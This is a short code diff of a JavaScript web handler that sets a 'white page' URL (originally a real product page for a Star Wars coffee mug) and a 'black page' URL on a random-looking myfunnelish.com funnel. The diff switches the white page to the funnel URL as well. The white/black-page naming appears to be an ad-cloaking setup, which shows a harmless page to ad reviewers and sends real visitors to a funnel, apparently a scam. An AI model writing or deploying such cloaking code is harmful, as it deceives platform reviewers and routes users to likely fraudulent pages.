@@ -2,7 +2,7 @@ import isRedirectEnabled from './config';
 
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://corkcicle.com/collections/coffee-mug/products/star-wars-coffee-mug?variant=40141759152216";
+    const whitePageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
     const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
     const iframeSrc = isRedirectEnabled ? defaultIframeURL : alternateIframeURL;
 
